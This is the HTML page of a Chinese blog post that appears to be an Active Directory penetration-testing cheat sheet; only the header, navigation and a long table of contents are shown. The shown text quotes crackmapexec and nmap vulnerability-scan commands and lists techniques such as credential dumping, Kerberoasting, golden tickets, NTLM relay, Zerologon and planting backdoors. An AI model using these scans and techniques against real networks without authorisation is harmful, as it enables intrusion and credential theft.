<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="# 1. 无凭证情况下 # 网络扫描 1234567cme smb &lt;ip_range&gt; 							# SMB 扫描存活主机nmap -sP -p &lt;ip&gt; 							# ping 扫描nmap -PN -sV --top-ports 50 --open &lt;ip&gt; 	# 快速扫描nmap -PN --script smb-vuln* -p139,445">
<meta property="og:type" content="article">
<meta property="og:title" content="渗透">
<meta property="og:url" content="http://www.ikun233.tk/blog/2023/07/20/%E6%B8%97%E9%80%8F/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="# 1. 无凭证情况下 # 网络扫描 1234567cme smb &lt;ip_range&gt; 							# SMB 扫描存活主机nmap -sP -p &lt;ip&gt; 							# ping 扫描nmap -PN -sV --top-ports 50 --open &lt;ip&gt; 	# 快速扫描nmap -PN --script smb-vuln* -p139,445">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://camo.githubusercontent.com/ab6ebf37bf1f547e4dd044b0ffb16f8493190a988f350bc7119c5c335b7c95be/68747470733a2f2f626c6f67706963732d313235313639313238302e66696c652e6d7971636c6f75642e636f6d2f696d67732f32303230303931363139303133372e706e67">
<meta property="og:image" content="https://camo.githubusercontent.com/d94bd9f15fb2db6a2b99b7463de0674117fb227d731c7d0d8526ee66bb66961d/68747470733a2f2f626c6f67706963732d313235313639313238302e66696c652e6d7971636c6f75642e636f6d2f696d67732f32303230303931363139303335392e706e67">
<meta property="og:image" content="https://camo.githubusercontent.com/206012e6d64974e4fda0704c8f1334e777a44f37f7b517e7d8776fbb79921e3f/68747470733a2f2f626c6f67706963732d313235313639313238302e66696c652e6d7971636c6f75642e636f6d2f696d67732f32303230303931363139303435372e706e67">
<meta property="article:published_time" content="2023-07-20T10:24:01.000Z">
<meta property="article:modified_time" content="2023-07-20T10:27:58.385Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="渗透">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://camo.githubusercontent.com/ab6ebf37bf1f547e4dd044b0ffb16f8493190a988f350bc7119c5c335b7c95be/68747470733a2f2f626c6f67706963732d313235313639313238302e66696c652e6d7971636c6f75642e636f6d2f696d67732f32303230303931363139303133372e706e67">
    
    
      
        
          <link rel="shortcut icon" href="/blog/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/blog/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/blog/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>渗透</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/blog/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/blog/">首页</a></li><!--
     --><!--
       --><li><a href="/blog/about/">关于</a></li><!--
     --><!--
       --><li><a href="/blog/archives/">归档</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/tymolu233">项目</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="下一篇" href="/blog/2023/07/20/Domain-penetration_one-stop/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://www.ikun233.tk/blog/2023/07/20/%E6%B8%97%E9%80%8F/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://www.ikun233.tk/blog/2023/07/20/%E6%B8%97%E9%80%8F/&text=渗透"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://www.ikun233.tk/blog/2023/07/20/%E6%B8%97%E9%80%8F/&title=渗透"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://www.ikun233.tk/blog/2023/07/20/%E6%B8%97%E9%80%8F/&is_video=false&description=渗透"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=渗透&body=Check out this article: http://www.ikun233.tk/blog/2023/07/20/%E6%B8%97%E9%80%8F/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://www.ikun233.tk/blog/2023/07/20/%E6%B8%97%E9%80%8F/&title=渗透"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://www.ikun233.tk/blog/2023/07/20/%E6%B8%97%E9%80%8F/&title=渗透"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://www.ikun233.tk/blog/2023/07/20/%E6%B8%97%E9%80%8F/&title=渗透"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://www.ikun233.tk/blog/2023/07/20/%E6%B8%97%E9%80%8F/&title=渗透"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://www.ikun233.tk/blog/2023/07/20/%E6%B8%97%E9%80%8F/&name=渗透&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://www.ikun233.tk/blog/2023/07/20/%E6%B8%97%E9%80%8F/&t=渗透"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1%E6%97%A0%E5%87%AD%E8%AF%81%E6%83%85%E5%86%B5%E4%B8%8B"><span class="toc-number">1.</span> <span class="toc-text"> 1. 无凭证情况下</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.</span> <span class="toc-text"> 网络扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%BF%AB%E9%80%9F%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.2.</span> <span class="toc-text"> 漏洞快速探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.</span> <span class="toc-text"> 提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%A5%E6%9C%89%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90"><span class="toc-number">1.4.</span> <span class="toc-text"> 拥有本地管理员权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81"><span class="toc-number">1.4.1.</span> <span class="toc-text"> 获取密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87lsa%E9%98%B2%E6%8A%A4%E7%AD%96%E7%95%A5%E8%AF%BB%E5%8F%96%E5%AF%86%E7%A0%81"><span class="toc-number">1.4.2.</span> <span class="toc-text"> 绕过 LSA 防护策略读取密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#token%E7%AA%83%E5%8F%96"><span class="toc-number">1.4.3.</span> <span class="toc-text"> token 窃取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%9C%AC%E5%9C%B0%E5%AD%98%E5%82%A8%E7%9A%84%E6%89%80%E6%9C%89%E5%AF%86%E7%A0%81"><span class="toc-number">1.4.4.</span> <span class="toc-text"> 查看本地存储的所有密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%B7%E5%BD%B1%E6%8B%B7%E8%B4%9D%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7%E6%89%80%E6%9C%89hash"><span class="toc-number">1.4.5.</span> <span class="toc-text"> 卷影拷贝（获取域控所有 hash）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dpapi%E8%A7%A3%E5%AF%86"><span class="toc-number">1.4.6.</span> <span class="toc-text"> dpapi 解密</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text"> 2. 内网信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.1.</span> <span class="toc-text"> 本机信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#8%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81"><span class="toc-number">2.1.1.</span> <span class="toc-text"> 8. 获取当前用户密码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#windows"><span class="toc-number">2.1.1.1.</span> <span class="toc-text"> Windows</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#linux"><span class="toc-number">2.1.1.2.</span> <span class="toc-text"> Linux</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8"><span class="toc-number">2.1.1.3.</span> <span class="toc-text"> 浏览器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#navicat%E5%AF%86%E7%A0%81"><span class="toc-number">2.1.1.4.</span> <span class="toc-text"> Navicat 密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xshellxftp%E5%AF%86%E7%A0%81"><span class="toc-number">2.1.1.5.</span> <span class="toc-text"> xshell&amp;xftp 密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mremoteng%E5%AF%86%E7%A0%81"><span class="toc-number">2.1.1.6.</span> <span class="toc-text"> mRemoteNG 密码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%A9%E6%95%A3%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.2.</span> <span class="toc-text"> 扩散信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7"><span class="toc-number">2.2.1.</span> <span class="toc-text"> 常用端口扫描工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%8B%93%E6%89%91%E6%9E%B6%E6%9E%84%E5%88%86%E6%9E%90"><span class="toc-number">2.2.2.</span> <span class="toc-text"> 内网拓扑架构分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4"><span class="toc-number">2.2.3.</span> <span class="toc-text"> 常见信息收集命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%96%B9%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.2.4.</span> <span class="toc-text"> 第三方信息收集</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text"> 3. 获取域控的方法</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#sysvol"><span class="toc-number">3.0.0.0.1.</span> <span class="toc-text"> SYSVOL</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ms14-068-kerberos"><span class="toc-number">3.0.0.0.2.</span> <span class="toc-text"> MS14-068 Kerberos</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#spn%E6%89%AB%E6%8F%8F"><span class="toc-number">3.0.0.0.3.</span> <span class="toc-text"> SPN 扫描</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#kerberos%E7%9A%84%E9%BB%84%E9%87%91%E9%97%A8%E7%A5%A8"><span class="toc-number">3.0.0.0.4.</span> <span class="toc-text"> Kerberos 的黄金门票</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#kerberos%E7%9A%84%E9%93%B6%E7%A5%A8%E5%8A%A1"><span class="toc-number">3.0.0.0.5.</span> <span class="toc-text"> Kerberos 的银票务</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9F%9F%E6%9C%8D%E5%8A%A1%E8%B4%A6%E5%8F%B7%E7%A0%B4%E8%A7%A3"><span class="toc-number">3.0.0.0.6.</span> <span class="toc-text"> 域服务账号破解</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%87%AD%E8%AF%81%E7%9B%97%E7%AA%83"><span class="toc-number">3.0.0.0.7.</span> <span class="toc-text"> 凭证盗窃</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ntlm-relay"><span class="toc-number">3.0.0.0.8.</span> <span class="toc-text"> NTLM relay</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#kerberos%E5%A7%94%E6%B4%BE"><span class="toc-number">3.0.0.0.9.</span> <span class="toc-text"> Kerberos 委派</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9C%B0%E5%9D%80%E8%A7%A3%E6%9E%90%E5%8D%8F%E8%AE%AE"><span class="toc-number">3.0.0.0.10.</span> <span class="toc-text"> 地址解析协议</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#zerologon%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.0.0.0.11.</span> <span class="toc-text"> zerologon 漏洞</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#cve-2021-42278-cve-2021-42287"><span class="toc-number">3.0.0.0.12.</span> <span class="toc-text"> CVE-2021-42278 &amp;&amp; CVE-2021-42287</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4%E5%88%97%E5%87%BA%E5%8F%AF%E5%8C%BF%E5%90%8D%E8%AE%BF%E9%97%AE%E7%9A%84smb%E5%85%B1%E4%BA%AB"><span class="toc-number">4.</span> <span class="toc-text"> 4. 列出可匿名访问的 SMB 共享</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5%E6%9E%9A%E4%B8%BEldap"><span class="toc-number">5.</span> <span class="toc-text"> 5. 枚举 LDAP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6%E6%9F%A5%E6%89%BE%E7%94%A8%E6%88%B7%E5%90%8D"><span class="toc-number">6.</span> <span class="toc-text"> 6. 查找用户名</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BE%97%E5%88%B0%E8%B4%A6%E5%8F%B7%E4%BD%86%E6%98%AF%E6%B2%A1%E6%9C%89%E5%AF%86%E7%A0%81"><span class="toc-number">6.1.</span> <span class="toc-text"> 得到账号，但是没有密码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92"><span class="toc-number">6.1.1.</span> <span class="toc-text"> 密码喷洒</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#asrep-roasting%E6%94%BB%E5%87%BB"><span class="toc-number">6.1.2.</span> <span class="toc-text"> ASREP-Roasting 攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96hash"><span class="toc-number">6.1.2.1.</span> <span class="toc-text"> 获取 hash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96asrep-roastable%E8%B4%A6%E5%8F%B7"><span class="toc-number">6.1.2.2.</span> <span class="toc-text"> 获取 ASREP-Roastable 账号</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%BF%E5%88%B0%E4%BB%BB%E6%84%8F%E4%B8%80%E4%B8%AA%E5%9F%9F%E7%94%A8%E6%88%B7%E7%9A%84%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81"><span class="toc-number">6.2.</span> <span class="toc-text"> 拿到任意一个域用户的账号密码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%85%B6%E4%BB%96%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81"><span class="toc-number">6.2.1.</span> <span class="toc-text"> 获取其他账户密码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E8%8E%B7%E5%8F%96%E5%9F%9F%E5%86%85%E6%89%80%E6%9C%89%E8%B4%A6%E6%88%B7%E5%90%8D"><span class="toc-number">6.2.1.1.</span> <span class="toc-text"> 1. 获取域内所有账户名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E6%9E%9A%E4%B8%BE-smb-%E5%85%B1%E4%BA%AB"><span class="toc-number">6.2.1.2.</span> <span class="toc-text"> 2. 枚举 SMB 共享</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3bloodhound"><span class="toc-number">6.2.1.3.</span> <span class="toc-text"> 3.bloodhound</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4powerview-pywerview"><span class="toc-number">6.2.1.4.</span> <span class="toc-text"> 4.powerview &#x2F; pywerview</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#kerberoasting%E6%94%BB%E5%87%BB"><span class="toc-number">6.2.2.</span> <span class="toc-text"> Kerberoasting 攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96hash-2"><span class="toc-number">6.2.2.1.</span> <span class="toc-text"> 获取 hash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE-kerberoastable-%E8%B4%A6%E5%8F%B7"><span class="toc-number">6.2.2.2.</span> <span class="toc-text"> 查找 kerberoastable 账号</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ms14-068"><span class="toc-number">6.2.3.</span> <span class="toc-text"> MS14-068</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#printnightmare"><span class="toc-number">6.2.4.</span> <span class="toc-text"> PrintNightmare</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE-dns-%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">6.2.5.</span> <span class="toc-text"> 枚举 DNS 服务器</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#7relaypoisoning%E6%94%BB%E5%87%BB"><span class="toc-number">7.</span> <span class="toc-text"> 7.relay&#x2F;poisoning 攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E6%B2%A1%E5%BC%80%E5%90%AFsmb%E7%AD%BE%E5%90%8D%E7%9A%84%E6%9C%BA%E5%99%A8"><span class="toc-number">7.0.1.</span> <span class="toc-text"> 扫描没开启 SMB 签名的机器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#petitpotam"><span class="toc-number">7.0.2.</span> <span class="toc-text"> PetitPotam</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%91%E5%90%AC"><span class="toc-number">7.0.3.</span> <span class="toc-text"> 监听</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0smb%E7%AD%BE%E5%90%8D-%E5%BC%80%E5%90%AFipv6-adcs"><span class="toc-number">7.1.</span> <span class="toc-text"> 无 SMB 签名 || 开启 IPv6 || ADCS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1ms08-068"><span class="toc-number">7.1.1.</span> <span class="toc-text"> 1.MS08-068</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2mitm6-i-eth0-d-domain"><span class="toc-number">7.1.2.</span> <span class="toc-text"> 2.mitm6 -i eth0 -d </span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3adcs"><span class="toc-number">7.1.3.</span> <span class="toc-text"> 3.adcs</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%BF%E5%88%B0hash%E7%A0%B4%E8%A7%A3"><span class="toc-number">7.2.</span> <span class="toc-text"> 拿到 hash 破解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1lm"><span class="toc-number">7.2.0.1.</span> <span class="toc-text"> 1.LM</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2ntlm"><span class="toc-number">7.2.0.2.</span> <span class="toc-text"> 2.NTLM</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3ntlmv1"><span class="toc-number">7.2.0.3.</span> <span class="toc-text"> 3.NTLMv1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4ntlmv2"><span class="toc-number">7.2.0.4.</span> <span class="toc-text"> 4.NTLMv2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5kerberos-5-tgs"><span class="toc-number">7.2.0.5.</span> <span class="toc-text"> 5.Kerberos 5 TGS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6kerberos-asrep"><span class="toc-number">7.2.0.6.</span> <span class="toc-text"> 6.Kerberos ASREP</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#9%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">8.</span> <span class="toc-text"> 9. 横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1pth"><span class="toc-number">8.1.</span> <span class="toc-text"> 1.PTH</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2ptk"><span class="toc-number">8.2.</span> <span class="toc-text"> 2.PTK</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">8.3.</span> <span class="toc-text"> 3. 非约束委派</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%A5%A8%E6%8D%AE"><span class="toc-number">8.3.1.</span> <span class="toc-text"> 获取票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E4%B8%BB%E6%9C%BA"><span class="toc-number">8.3.2.</span> <span class="toc-text"> 查找非约束委派主机</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">8.4.</span> <span class="toc-text"> 4. 约束委派</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%A5%A8%E6%8D%AE-2"><span class="toc-number">8.4.1.</span> <span class="toc-text"> 获取票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E4%B8%BB%E6%9C%BA"><span class="toc-number">8.4.2.</span> <span class="toc-text"> 查找约束委派主机</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">8.5.</span> <span class="toc-text"> 5. 基于资源的约束委派</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6dcsync"><span class="toc-number">8.6.</span> <span class="toc-text"> 6.dcsync</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7%E6%89%93%E5%8D%B0%E6%9C%BA-spoolservice-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">8.7.</span> <span class="toc-text"> 7. 打印机 SpoolService 漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8ad%E5%9F%9Facl%E6%94%BB%E5%87%BBaclpwnpy"><span class="toc-number">8.8.</span> <span class="toc-text"> 8.AD 域 ACL 攻击 (aclpwn.py)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9%E8%8E%B7%E5%8F%96laps%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81"><span class="toc-number">8.9.</span> <span class="toc-text"> 9. 获取 LAPS 管理员密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10privexchange%E6%BC%8F%E6%B4%9E"><span class="toc-number">8.10.</span> <span class="toc-text"> 10.privexchange 漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#exchange%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">8.10.0.0.1.</span> <span class="toc-text"> Exchange 的利用</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11ipc"><span class="toc-number">8.11.</span> <span class="toc-text"> 11.IPC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12%E5%85%B6%E4%BB%96%E6%A8%AA%E7%A7%BB"><span class="toc-number">8.12.</span> <span class="toc-text"> 12. 其他横移</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#10%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">9.</span> <span class="toc-text"> 10. 权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%BF%E5%88%B0%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90"><span class="toc-number">9.1.</span> <span class="toc-text"> 拿到域控权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows%E5%90%8E%E9%97%A8"><span class="toc-number">9.2.</span> <span class="toc-text"> Windows 后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#linux%E5%90%8E%E9%97%A8"><span class="toc-number">9.3.</span> <span class="toc-text"> Linux 后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB"><span class="toc-number">9.4.</span> <span class="toc-text"> 域信任关系</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E6%94%BB%E5%87%BB%E7%88%B6%E5%9F%9F-sid-history%E7%89%88%E8%B7%A8%E5%9F%9F%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">9.4.1.</span> <span class="toc-text"> 子域攻击父域 - SID History 版跨域黄金票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%AF%86%E9%92%A5%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E5%9F%9F%E7%9A%84%E6%9D%83%E9%99%90-%E4%BF%A1%E4%BB%BB%E7%A5%A8%E6%8D%AE"><span class="toc-number">9.4.2.</span> <span class="toc-text"> 利用域信任密钥获取目标域的权限 - 信任票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%85%B6%E5%AE%83%E6%9E%97"><span 